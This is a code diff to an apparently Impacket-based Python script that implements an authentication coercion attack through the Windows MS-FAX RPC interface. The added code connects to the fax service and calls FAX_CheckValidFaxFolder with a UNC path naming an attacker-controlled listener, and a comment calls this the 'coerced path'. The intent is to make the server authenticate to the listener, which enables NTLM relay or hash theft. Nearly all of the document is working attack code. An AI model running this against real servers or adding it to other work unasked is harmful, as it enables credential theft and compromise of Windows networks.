@@ -29,11 +29,29 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
+class FAX_ConnectFaxServer(NDRCALL):
+    # Opnum 80: the required prerequisite. It establishes the caller's fax user account
+    # context; FAX_CheckValidFaxFolder is denied without a prior successful connection.
+    opnum = 80
+    structure = (
+        ('dwClientAPIVersion', DWORD),  # FAX_API_VERSION_3 = 0x00030000
+    )
+
+
+class FAX_ConnectFaxServerResponse(NDRCALL):
+    structure = (
+        ('lpdwServerAPIVersion', DWORD),
+        ('pHandle', '20s'),  # PRPC_FAX_SVC_HANDLE (20-byte context handle)
+    )
+
+
 class FAX_CheckValidFaxFolder(NDRCALL):
+    # hBinding is the implicit handle_t of the IDL and is therefore NOT a marshalled field;
+    # lpcwstrPath is [in, string, ref] LPCWSTR and must be a complete UNC path including a
+    # file name, under 180 characters.
     opnum = 86
     structure = (
-        ('hBinding', HANDLE_T), # Type: handle_t
-        ('lpcwstrPath', LPWSTR), # Type: LPCWSTR
+        ('lpcwstrPath', LPWSTR),
     )
 
 
@@ -105,30 +123,34 @@ class RPCProtocol(object):
 
 
 class MS_FAX(RPCProtocol):
-    uuid = "6099fc12-3eff-11d0-abd0-00c04fd91a4e"
-    version = "0.0"
+    uuid = "ea0a3165-4834-11d2-a6f8-00c04fa346cc"
+    version = "4.0"
     pipe = r"\PIPE\SHAREDFAX"
 
     def FAX_CheckValidFaxFolder(self, listener):
-        if self.dce is not None:
-            print("[>] Calling FAX_CheckValidFaxFolder() ...")
-            try:
-                request = FAX_CheckValidFaxFolder()
-
-            
-                request['hBinding'] = None
-            
-
-            
-                request['lpcwstrPath'] = None
-            
-
-                # request.dump()
-                resp = self.dce.request(request)
-            except Exception as e:
-                print(e)
-        else:
+        if self.dce is None:
             print("[!] Error: dce is None, you must call connect() first.")
+            return
+        # Prerequisite: FAX_ConnectFaxServer (opnum 80) establishes the fax user account
+        # context for the association ([MS-FAX] 3.1.4.1.10).
+        print("[>] Calling FAX_ConnectFaxServer() ...")
+        try:
+            conn = FAX_ConnectFaxServer()
+            conn['dwClientAPIVersion'] = 0x00030000  # FAX_API_VERSION_3
+            r = self.dce.request(conn)
+            print("[+] Connected, server API version = 0x%08x" % r['lpdwServerAPIVersion'])
+        except Exception as e:
+            print("[!] FAX_ConnectFaxServer failed: %s" % e)
+            return
+        # The coerced path: a complete UNC path with a file name. The server resolves it to
+        # confirm the folder is accessible ([MS-FAX] 3.1.4.1.86), authenticating on the way.
+        print("[>] Calling FAX_CheckValidFaxFolder() ...")
+        try:
+            request = FAX_CheckValidFaxFolder()
+            request['lpcwstrPath'] = ('\\\\%s\\share\\file.tif' % listener) + '\x00'
+            resp = self.dce.request(request)
+        except Exception as e:
+            print(e)
 
 
 if __name__ == '__main__':
